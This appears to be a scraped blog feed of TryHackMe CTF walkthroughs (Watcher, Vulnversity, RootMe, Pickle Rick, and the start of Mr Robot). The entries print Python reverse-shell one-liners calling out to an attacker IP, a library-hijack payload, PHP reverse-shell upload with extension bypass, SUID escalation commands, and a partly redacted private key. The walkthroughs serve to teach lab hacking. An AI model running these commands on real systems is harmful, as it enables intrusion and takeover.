mat@watcher:~$ mat@watcher:~$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' python3 -c 'import pty;pty.spawn(\"/bin/bash\")' mat@watcher:~$ export TERM=xterm export TERM=xterm mat@watcher:~$ ^Z zsh: suspended nc -lnvp 9001 ┌──(sirius㉿kali)-[~] └─$ stty raw -echo; fg 148 ⨯ 1 ⚙[1] + continued nc -lnvp 9001 mat@watcher:~$ ls cow.jpg flag_5.txt note.txt scripts mat@watcher:~$ whoami mat As mat now, we can get our fifth flag.Flag 6Nice, we became mat now, let’s see what can we do as mat here:mat@watcher:~$ sudo -l Matching Defaults entries for mat on watcher: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mat may run the following commands on watcher: (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *We can run will_script.py as will, let’s see what the script does:mat@watcher:~/scripts$ cat will_script.pyimport osimport sysfrom cmd import get_commandcmd = get_command(sys.argv[1])whitelist = [\"ls -lah\", \"id\", \"cat /etc/passwd\"]if cmd not in whitelist: print(\"Invalid command!\") exit()os.system(cmd)The script calls os, sys and cmd libraries, and then tries to execute one of the following commands : ls -lah\", \"id\", \"cat /etc/passwd depending on what we gave it as an argument.We will be hijacking one of the libraries in order to get another reverse shell. The only library we have write permission to is cmd.py, so let’s put a python script in the file:import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]); Note : don’t forget to change the ip adress in the script!!The cmd.py file now looks like this:mat@watcher:~/scripts$ cat cmd.py import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]); def get_command(num): if(num == \"1\"): return \"ls -lah\" if(num == \"2\"): return \"id\" if(num == \"3\"): return \"cat /etc/passwd\" mat@watcher:~/scripts$ Let’s set up another listener for this and then run the script:mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script 2$nc -lvnp 9000listening on [any] 1234 ...connect to [10.10.10.10] from (UNKNOWN) [10.10.180.180] 38226$ whoamiwillGreat, we escalated to will now.Flag 7After some enumeration, we found base64 encoded file located in /opt directory:will@watcher:/opt/backups$ lskey.b64will@watcher:/opt/backups$ base64 -d key.b64-----BEGIN RSA PRIVATE KEY-----RedactedAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aGopZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgAnM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1XeFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVtdSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/cq3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2czBQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0QTQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B61wsUA85+vqNFrxzFY/redactedredactedredactedredacted+++w+t0QRB5RCFAlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpIUbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4DSPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9QA/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZgLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+BdbKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUOkJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn54APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRredactedredacted==-----END RSA PRIVATE KEY-----will@watcher:/opt/backups$When we decode the file, we see that it is a SSH private key, let’s copy it to our machine, give it the right permissions, and try to connect with it. ┌──(sirius㉿kali)-[~/CTF/THM/watcher]└─$ chmod 400 id_rsa ┌──(sirius㉿kali)-[~/CTF/THM/watcher]└─$ ssh -i id_rsa root@10.10.10.10 255 ⨯Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Jan 13 12:28:44 UTC 2022 System load: 0.0 Processes: 124 Usage of /: 22.5% of 18.57GB Users logged in: 0 Memory usage: 37% IP address for eth0: 10.10.18.205 Swap usage: 0% IP address for lxdbr0: 10.14.179.133 packages can be updated.0 updates are security updates.Last login: Thu Dec 3 03:25:38 2020root@watcher:~# lsflag_7.txtroot@watcher:~#Great, we are root now. This was an amazing machine, hope you have enjoyed it as much as i did, and see you in the next hack." }, { "title": "TryHackMe - Vulnversity", "url": "/posts/Vulnversity/", "categories": "TryHackMe", "tags": "tryhackme, linux, web, reverse-shell, suid, filter", "date": "2022-01-07 01:00:00 +0100", "snippet": " Hello l33ts, I hope you are doing well. Today we are going to look at Vulnversity, an easy machine from TryHackMe, let’s dive into it.DescriptionLearn about active recon, web app attacks and privilege escalation.EnumerationnmapAs always, let’s start our nmap scan, i will be using this command:sudo nmap -sC -sV -T4 {target_IP} | tee scans/nmap -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressice scan to provide faster results. tee scan/nmap: Save the output to a file named nmap. $ sudo nmap -sC -sV -T4 10.10.131.61 | tee scans/nmapStarting Nmap 7.92 ( https://nmap.org )Nmap scan report for 10.10.131.61Host is up (0.11s latency).Not shown: 994 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)| 256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)|_ 256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)3128/tcp open http-proxy Squid http proxy 3.5.12|_http-server-header: squid/3.5.12|_http-title: ERROR: The requested URL could not be retrieved3333/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Vuln UniversityService Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h23m32s, deviation: 2h53m13s, median: -16m27s| smb2-time:| date: 2022-01-05T09:34:30|_ start_date: N/A| smb-os-discovery:| OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: vulnuniversity| NetBIOS computer name: VULNUNIVERSITY\\x00| Domain name: \\x00| FQDN: vulnuniversity|_ System time: 2022-01-05T04:34:28-05:00| smb2-security-mode:| 3.1.1:|_ Message signing enabled but not required|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)We found 6 open ports on our target machine, 2 port seems interesting to us, 21(FTP) and 3333(HTTP). The FTP service doesn’t seem to have any vulnerability and it doesn’t allow us to login as anonymous. Let’s now check the http server by running a Gobuster scan.GobusterIn order to scan for directories and file using gobuster, i will be using the following command: gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,txt -u http://{target_IP}:3333 | tee gobuster$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,txt -u http://10.10.131.61:3333 | tee gobuster===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.131.61:3333[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: txt,php[+] Timeout: 10s===============================================================/.hta.txt (Status: 403) [Size: 297]/.hta.php (Status: 403) [Size: 297]/.hta (Status: 403) [Size: 293]/.htaccess (Status: 403) [Size: 298]/.htpasswd (Status: 403) [Size: 298]/.htaccess.php (Status: 403) [Size: 302]/.htpasswd.php (Status: 403) [Size: 302]/.htaccess.txt (Status: 403) [Size: 302]/.htpasswd.txt (Status: 403) [Size: 302]/css (Status: 301) [Size: 317] [--&gt; http://10.10.131.61:3333/css/]/fonts (Status: 301) [Size: 319] [--&gt; http://10.10.131.61:3333/fonts/]/images (Status: 301) [Size: 320] [--&gt; http://10.10.131.61:3333/images/]/index.html (Status: 200) [Size: 33014] /internal (Status: 301) [Size: 322] [--&gt; http://10.10.131.61:3333/internal/]/js (Status: 301) [Size: 316] [--&gt; http://10.10.131.61:3333/js/] /server-status (Status: 403) [Size: 302] ===============================================================Gobuster found a directory called /internal, let’s check it out.That’s an upload page, let’s try to upload a php reverse shell, i this case i will be using pentestmonkey’s php_reverse_shell. you have to change the ip address in the script to your attacking machine’s ip address: run the command ip a show tun0 or ifconfig to get your ip address.When we try to upload the file, the website seems to be blocking .php file extension, we will need to change that, some of the extensions we can use are: .phar - .pht - phps - phtml - php3 - .php4 - .php5 - .php7We can use Burp Suit to automate this process by creating a list that contains the previous extensions.I will be doing it manually here, we find the the .phtml is not blocked, and our reverse shell got uploaded, but we don’t know where it went, let’s do a second Gobuster scan in the /internal directory: gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP}:3333/internal$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.131.61:3333/internal gobuster 130 ⨯===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.131.61:3333/internal[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/01/05 05:01:29 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 302]/.htaccess (Status: 403) [Size: 307]/.htpasswd (Status: 403) [Size: 307]/css (Status: 301) [Size: 326] [--&gt; http://10.10.131.61:3333/internal/css/]/index.php (Status: 200) [Size: 525] /uploads (Status: 301) [Size: 330] [--&gt; http://10.10.131.61:3333/internal/uploads/]===============================================================We found /uploads directory, this is where the uploads go, when we navigate to it, we find our shell there.FootholdLet’s set a listener on our machine: nc -nlvp 1234, after that, we need to click on the payload to receive a reverse shell.$ nc -lnvp 1234listening on [any] 1234 ...connect to [10.11.31.131] from (UNKNOWN) [10.10.131.61] 56840Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 04:53:37 up 24 min, 0 users, load average: 0.00, 0.00, 0.03USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@vulnuniversity:/$ export TERM=xtermexport TERM=xtermwww-data@vulnuniversity:/$ ^Zzsh: suspended nc -lnvp 1234┌──(root㉿kali)-[/tmp/arsenal]└─$ stty raw -echo; fg 148 ⨯ 1 ⚙[1] + continued nc -lnvp 1234www-data@vulnuniversity:/$ whoamiwww-datawww-data@vulnuniversity:/$The commands i executed are for getting a fully functional shell, so that we can use the arrow keys, TAB key and more, you don’t have to use them if you don’t want to.Privilege EscalationTime to upgrade to root, i will be running sudo -l, id commands and search for some SUID binaries using this command: find / -type f -perm -04000 2&gt;/dev/nullwww-data@vulnuniversity:/home/bill$ sudo -l [sudo] password for www-data:www-data@vulnuniversity:/home/bill$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@vulnuniversity:/home/bill$ find / -type f -perm -04000 2&gt;/dev/null/usr/bin/newuidmap/usr/bin/chfn/usr/bin/newgidmap/usr/bin/sudo/usr/bin/chsh/usr/bin/passwd/usr/bin/pkexec/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/at/usr/lib/snapd/snap-confine/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/squid/pinger/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/bin/su/bin/ntfs-3g/bin/mount/bin/ping6/bin/umount/bin/systemctl/bin/ping/bin/fusermount/sbin/mount.cifswww-data@vulnuniversity:/home/bill$After searching for SUID binaries, we found an interesting one, it’s systemctl, let’s search it in GTFOBinsGreat! it is possible for us to get root using that, but we need to make some changes to that before trying to execute it. I will be changing the command that gets executed from id &gt; /tmp/output to cp /bin/bash /tmp/bash; chmod +s /tmp/bash. What that does is take a copy of bash and put in tmp directory. After that, it adds a SUID bit to that file so that we can execute as it’s owner that is root. We also need to change the path of the binary from ./systemctl to /bin/systemctl. Here is how are final commands should look like:TF=$(mktemp).serviceecho '[Service]Type=oneshotExecStart=/bin/sh -c \"cp /bin/bash /tmp/bash; chmod +s /tmp/bash\"[Install]WantedBy=multi-user.target' &gt; $TF/bin/systemctl link $TF/bin/systemctl enable --now $TFNow let’s copy that and paste it into our reverse shell.www-data@vulnuniversity:/home/bill$ TF=$(mktemp).servicewww-data@vulnuniversity:/home/bill$ echo '[Service]&gt; Type=oneshot&gt; ExecStart=/bin/sh -c \"cp /bin/bash /tmp/bash; chmod +s /tmp/bash\"&gt; [Install]&gt; WantedBy=multi-user.target' &gt; $TFwww-data@vulnuniversity:/home/bill$ /bin/systemctl link $TFCreated symlink from /etc/systemd/system/tmp.wxqqFW7qE1.service to /tmp/tmp.wxqqFW7qE1.service.www-data@vulnuniversity:/home/bill$ /bin/systemctl enable --now $TFCreated symlink from /etc/systemd/system/multi-user.target.wants/tmp.wxqqFW7qE1.service to /tmp/tmp.wxqqFW7qE1.service.www-data@vulnuniversity:/home/bill$ ls -l /tmptotal 1028-rwsr-sr-x 1 root root 1037528 Jan 5 04:57 bashdrwx------ 3 root root 4096 Jan 5 04:29 systemd-private-8ac40940bfe640f0801c67ff38799d9a-systemd-timesyncd.service-2tCa9l-rw------- 1 www-data www-data 0 Jan 5 04:57 tmp.R8OuJkkl6C-rw-rw-rw- 1 www-data www-data 126 Jan 5 04:57 tmp.R8OuJkkl6C.service-rw------- 1 www-data www-data 0 Jan 5 04:57 tmp.wxqqFW7qE1-rw-rw-rw- 1 www-data www-data 126 Jan 5 04:57 tmp.wxqqFW7qE1.servicewww-data@vulnuniversity:/home/bill$ /tmp/bash -pbash-4.3# whoamirootbash-4.3#And just like that, we have rooted Vulnversity machine, hope you have enjoyed and see you in the next hack." }, { "title": "TryHackMe - RootMe", "url": "/posts/RootMe/", "categories": "TryHackMe", "tags": "tryhackme, linux, web, gobuster, suid, privesc, python, reverse-shell, filter", "date": "2022-01-03 01:00:00 +0100", "snippet": " Hello l33ts, I hope you are doing well. Today we are going to look at RootMe, a medium machine from TryHackMe. Let’s start.DescriptionA ctf for beginners, can you root me?EnumerationnmapLet’s start our nmap scan:sudo nmap -sC -sV -T4 {target_IP} -oN nmap.scan-sV : find the version of all the service running on the target-sC : run all the default scripts-oN : save the output in a file called nmap$ sudo nmap -sC -sV -T4 10.10.125.128 -oN nmap.scanStarting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 03:17 ESTNmap scan report for 10.10.125.128Host is up (0.11s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)| 256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)|_ 256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: HackIT - Home| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.89 secondsWe have to open ports: 22(SSH) 80(http)GobusterSince we have a web server, let’s do a directory scan using Gobuster:gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,txt -u {target_IP}$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,txt -u http://10.10.125.128 | tee gobuster===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.125.128[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php,txt[+] Timeout: 10s===============================================================2022/01/03 03:35:19 Starting gobuster in directory enumeration mode===============================================================/.htaccess (Status: 403) [Size: 278]/.htpasswd (Status: 403) [Size: 278]/.htaccess.txt (Status: 403) [Size: 278]/.hta (Status: 403) [Size: 278]/.htpasswd.php (Status: 403) [Size: 278]/.htaccess.php (Status: 403) [Size: 278]/.hta.php (Status: 403) [Size: 278]/.htpasswd.txt (Status: 403) [Size: 278]/.hta.txt (Status: 403) [Size: 278]/css (Status: 301) [Size: 312] [--&gt; http://10.10.125.128/css/]/index.php (Status: 200) [Size: 616] /index.php (Status: 200) [Size: 616] /js (Status: 301) [Size: 311] [--&gt; http://10.10.125.128/js/] /panel (Status: 301) [Size: 314] [--&gt; http://10.10.125.128/panel/]/server-status (Status: 403) [Size: 278] /uploads (Status: 301) [Size: 316] [--&gt; http://10.10.125.128/uploads/]===============================================================2022/01/03 03:37:50 Finished=============================================================== dir : for directory scan u : URL w : Wordlist x : Search for extensions(php,txt,html..)We found 2 directories that stand out: /panel and /uploads. Let’s see what’s on each one.We have an upload page here, and everything we upload goes to the /uploads directory. with that, let’s try to upload a php reverse shell. I will be using pentestmonkey’s reverse shell. you have to change the ip address in the script to your attacking machine’s ip address: run the command ip a show tun0 or ifconfig to get your ip addressOh! It seems that we can’t upload a .php file, let’s try changing that extension to another one. Some of the extensions that we can use are:.phar - .pht - phps - phtml - php3 - .php4 - .php5 - .php7After some try and error, we found that .phtml extension works.FootholdLet’s visit /uploads page, we should see our reverse shell there.Let’s now run a listener on our machine using this command nc -nlvp 1234. the port should be the same one in the reverse shell script!!After that, let’s execute the script by clicking on the file or by visiting it on (http://{target_IP}/uploads/shell.phtml)$ nc -lnvp 1234listening on [any] 1234 ...connect to [10.11.31.131] from (UNKNOWN) [10.10.125.128] 39406Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 09:33:55 up 1:48, 0 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@rootme:/$ export TERM=xtermexport TERM=xtermwww-data@rootme:/$ ^Z #typed ctrl+zzsh: suspended nc -lnvp 1234┌──(kali㉿kali)-[]└─$ stty raw -echo; fg 148 ⨯ 1 ⚙[1] + continued nc -lnvp 1234 #typed Enterwww-data@rootme:/$We got our shell, i executed some command there to get a fully functional shell. The commands are:[target machine] python3 -c 'import pty;pty.spawn(\"/bin/bash\")'[target machine] export TERM=xterm[target machine] ctrl+z[attacker machine] stty raw -echo;fgPrivilege EscalationLet’s now do some enumeration and see if we can find some privilege escalation vectors.sudo -l and id are always the go to commands once you get access to a machine.www-data@rootme:/$ sudo -l[sudo] password for www-data:www-data@rootme:/$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@rootme:/$That gave us nothing, let’s search for some SUID binaries:www-data@rootme:/$ find / -type f -perm -04000 2&gt;/dev/null [10/238]/usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/snapd/snap-confine /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/bin/traceroute6.iputils /usr/bin/newuidmap /usr/bin/newgidmap /usr/bin/chsh /usr/bin/python/usr/bin/at/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/bin/newgrp...That gave us a lot of binaries, but the one that looks interesting for us is /usr/bin/python. After looking for python in GTFOBins, we find that we can execute this command python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' to get a root shell, let’s do it:www-data@rootme:/$ python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'# whoamiroot# ls /rootroot.txt# ls /var/wwwhtml user.txt#Great, and just like that, we got root, I hope you guys enjoyed it.See you in the next hack!" }, { "title": "TryHackMe - Pickle Rick", "url": "/posts/Pickle-Rick/", "categories": "TryHackMe", "tags": "tryhackme, linux, web, reverse-shell, python, gobuster", "date": "2021-12-27 01:00:00 +0100", "snippet": " Hello l33ts, I hope you are doing well. Today we are going to look at Pickle Rick from TryHackMe.DescriptionThis Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.EnumerationAs usual, let’s start our nmap scan using this commad : sudo nmap -sV -sC {target_IP} -oN nmap.scan-sV - find the version of all the service running on the target-sC - run all the default scripts-oN - save the output in a file called nmapnmapStarting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 10:06 ESTNmap scan report for 10.10.237.232Host is up (0.12s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 85:92:6a:04:0e:1c:53:94:c6:8b:84:5f:c3:a3:fc:41 (RSA)| 256 c1:9b:c3:79:38:ee:e2:ed:fc:85:57:4f:ae:ef:2a:12 (ECDSA)|_ 256 81:d8:73:fe:2d:c0:ce:79:43:bc:56:e7:c9:64:aa:58 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Rick is sup4r cool|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 22.00 secondsWe see that there is 2 open ports: 22(SSH) 80(HTTP)Let’s check the web server. Oh no, it seems that Rick is in a problem, anyway, let’s check the page source code.Nice, we have found a username,Let’s now run Gobuster directory scan using the following command: gobuster dir -w /usr/share/wordlists/dirb/common.txt -u {target_IP} -x php,txt -x: is to tell gobuster to search for extensions(php, txt)Gobuster===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.237.232[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php,txt[+] Timeout: 10s===============================================================2021/12/24 10:19:06 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 292]/.hta.txt (Status: 403) [Size: 296]/.hta.php (Status: 403) [Size: 296]/.htaccess.txt (Status: 403) [Size: 301]/.htpasswd (Status: 403) [Size: 297]/.htaccess (Status: 403) [Size: 297]/.htpasswd.php (Status: 403) [Size: 301]/.htaccess.php (Status: 403) [Size: 301]/.htpasswd.txt (Status: 403) [Size: 301]/assets (Status: 301) [Size: 315] [--&gt; http://10.10.237.232/assets/]/denied.php (Status: 302) [Size: 0] [--&gt; /login.php] /index.html (Status: 200) [Size: 1062] /login.php (Status: 200) [Size: 882] /portal.php (Status: 302) [Size: 0] [--&gt; /login.php] /robots.txt (Status: 200) [Size: 17] /robots.txt (Status: 200) [Size: 17] /server-status (Status: 403) [Size: 301] ===============================================================Gobuster has found some good stuff, we have a login page and robots.txt file, let’s check the latter.That’s a weird string we have found, let’s save it and go check to login page.We have the username and the weird string we found in robots.txt, let’s supply them and see what happens.Great, we are in, and it seems we have a command panel where we can execute code on the target, let’s try to get a reverse shell with that.FootholdAfter checking that python3 is installed on the target machine with which python3 command, i executed the following command to get a reverse shell on my machine after setting up a listener of cource: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")' You need to change the ip address in the command!$ nc -lnvp 9001 130 ⨯listening on [any] 9001 ...connect to [10.11.31.131] from (UNKNOWN) [10.10.237.232] 58428$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@ip-10-10-237-232:/var/www/html$ export TERM=xtermexport TERM=xtermwww-data@ip-10-10-237-232:/var/www/html$ ^Z #pressed ctrl+zzsh: suspended nc -lnvp 9001$ stty raw -echo; fg 148 ⨯ 1 ⚙[1] + continued nc -lnvp 9001 #pressed enterwww-data@ip-10-10-237-232:/var/www/html$ lsSup3rS3cretPickl3Ingred.txt clue.txt index.html portal.phpassets denied.php login.php robots.txtwww-data@ip-10-10-237-232:/var/www/html$The commands i executed are for getting a stable shell.Privilege EscalationWhen we run sudo -l we see that we can run whatever we want!www-data@ip-10-10-237-232:/home/rick$ sudo -lMatching Defaults entries for www-data on ip-10-10-237-232.eu-west-1.compute.internal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on ip-10-10-237-232.eu-west-1.compute.internal: (ALL) NOPASSWD: ALLwww-data@ip-10-10-237-232:/home/rick$This made our task much easier. With that, we can upgrade directly to root.www-data@ip-10-10-237-232:/home/rick$ sudo suroot@ip-10-10-237-232:/home/rick# whoamirootroot@ip-10-10-237-232:/home/rick#And just like that we have rooted Pickle Rick machine, hope you guys enjoyed it. See you in the next Hack." }, { "title": "TryHackMe - Mr Robot CTF", "url": "/posts/MrRobotCtf/", "categories": "TryHackMe", "tags": "tryhackme, linux, web, privesc, reverse-shell, wordpress, bruteforce, hydra, suid, john, crack, gobuster", "date": "2021-12-21 01:00:00 +0100", "snippet": " Hello l33ts, I hope you are doing weel. This is my first Writeup, and we will be doing Mr robot CTF from tryhackme, it is a medium machine based on the Mr. RObot show. let’s dive into it.DescriptionCan you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?EnumerationNmapFirst, let’s start our nmap scan using this command:sudo nmap -sV -sC {target_IP} -oN nmap.scan-sV - find the version of all the service running on the target-sC - run all the default scripts-oN - save the output in a file called nmap$ sudo nmap -sV -sC 10.10.117.187Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 05:24 ESTNmap scan report for 10.10.117.187Host is up (0.10s latency).Not shown: 997 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp closed ssh80/tcp open http Apache httpd|_http-title: Site doesn't have a title (text/html).|_http-server-header: Apache443/tcp open ssl/http Apache httpd|_http-title: Site doesn't have a title (text/html).| ssl-cert: Subject: commonName=www.example.com| Not valid before: 2015-09-16T10:45:03|_Not valid after: 2025-09-13T10:45:03|_http-server-header: ApacheService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) 